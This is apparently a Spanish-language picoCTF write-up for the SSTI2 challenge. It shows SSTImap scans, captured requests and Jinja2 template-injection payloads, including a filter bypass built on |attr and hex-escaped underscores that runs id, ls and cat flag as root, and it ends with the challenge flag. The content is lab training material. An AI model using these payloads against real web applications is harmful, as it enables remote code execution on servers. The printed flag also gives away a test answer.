---
title: SSTI2
date: 2025-07-22 23:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>SSTI2
Author: Venax
Description
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website here!
{: .prompt-tip }

El reto se inicia con un formulario web que propone una entrada para hacer un anuncio, introduces un texto y se muestra en otra página en letras grandes.

```html
 Home

I built a cool website that lets you announce whatever you want!*
What do you want to announce: 
```

Si echamos la vista atrás en en reto [pico-ctf-sst1](../pico-ctf-sst1) ya hacíamos esta comprobación de provocar un error al introducir una división por zero y en este reto podemos hacer lo mismo, obteniendo el primer positivo al introducir { {1/0} }, en principio un positivo.

``` html
Internal Server Error
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```

En dicha ocasión me valí de **Sttimap** una herramienta que automatiza el proceso de explotación de este tipo de vulnerabilidades. Esta vez la detección nos dice que no puede levantar una shell, pero parece que sí hay un punto de inyección con motor Jinja2, supuestamente vulnerable. Toca seguir escarbando.

``` shell
(sstimap) pablo☠office sstimap$ ./sstimap.py  -f --os-shell --url="http://shape-facility.picoctf.net:52506"

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.3
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; generic: 3; legacy_engines: 2; engines: 17
[*] Loaded request body types: 4

[*] Starting form detection...
[+] Form found: POST http://shape-facility.picoctf.net:52506/ "content="
[*] Scanning form with url: http://shape-facility.picoctf.net:52506/
[+] SSTImap identified the following injection point:

  Body parameter: content
  Engine: Jinja2
  Injection: *
  Context: text
  OS: undetected
  Technique: render
  Capabilities:

    Shell command execution: no
    Bind and reverse shell: no
    File write: no
    File read: no
    Code evaluation: no

[-] No system command execution capabilities have been detected on the target.
```

Al capturar con Zap proxy el request, me doy cuenta de el el request se codifica antes de ser enviado. 

``` html
POST http://shape-facility.picoctf.net:52506/ HTTP/1.1
Host: shape-facility.picoctf.net:52506
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://shape-facility.picoctf.net:52506
Connection: keep-alive
Referer: http://shape-facility.picoctf.net:52506/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

content=%7B%7B3*3%7D%7D
```

%7B%7B3*3%7D%7D = { {3*3} } 

Ahora busqué un payload que funcionase con esta vulnerabilidad y encontré lo que me pareción muy razonable. Pues supuestamente estaríamos haciendo que este motor ejecute instrucciones de Python, por lo que podemos intentar algo así:

[https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-](https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-)

```
{ { request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() } }
```

Sin embargo el la web del formulario al enviar este payload nos envía a una web con el siguente mensaje

``` html 
Stop trying to break me >:(
```

Bueno no es la flag pero nos da una pista, si además hacemos caso de las pistas proporcionadas "Why is blacklisting characters a bad idea to sanitize input?", ¿Es posible que haya algún caracter(es) que filtre el formulario?.

Al hacer el request y capturar con Zap nos muestra que hay ciertos caracteres que no se está encodeando.

``` html
POST http://shape-facility.picoctf.net:52506/ HTTP/1.1
Host: shape-facility.picoctf.net:52506
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Origin: http://shape-facility.picoctf.net:52506
Connection: keep-alive
Referer: http://shape-facility.picoctf.net:52506/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

content=%7B%7B+request%5B%27application%27%5D%5B%27__globals__%27%5D%5B%27__builtins__%27%5D%5B%27__import__%27%5D%28%27os%27%29%5B%27popen%27%5D%28%27whoami%27%29%5B%27read%27%5D%28%29+%7D%7D
```

Encontré un payload aún más razonable respecto a lo comenta su autor. evitar que un WAF detecte ciertos caracteres como "_" o el ".", además este payload está adaptado a Jinja2. Por cierto muy interesante el repositorio, está lleno de payloads.
[https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9](https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9)

## ¿Qué es attr en Jinja2?
En Jinja2, attr es un filtro que sirve para acceder a un atributo de un objeto de forma dinámica usando el nombre del atributo como cadena.
Se utiliza cuando se hace uso de Jinja2 en un proyecto de esta forma. Y es la misma forma que vamos a probar para lanzar comandos.

```
{ { obj|attr('nombre_atributo') } }
```

## Generando un payload dirigido
```
{ {request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()} }
```
Resultado somos root
```
uid=0(root) gid=0(root) groups=0(root) 
```
Buscamos la flag primero lanzando un ls
```
{ {request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()} }
```
Encontramos el archivo flag
```
__pycache__ app.py flag requirements.txt 
```
Ya solo queda leer el archivo
```
{ {request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()} }
```
```
picoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}
```
flag: **picoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}**

Nota: Si alguno de estos payloads no te funciona prueba a juntar las llaves "{" pues es problemático para Chirpy.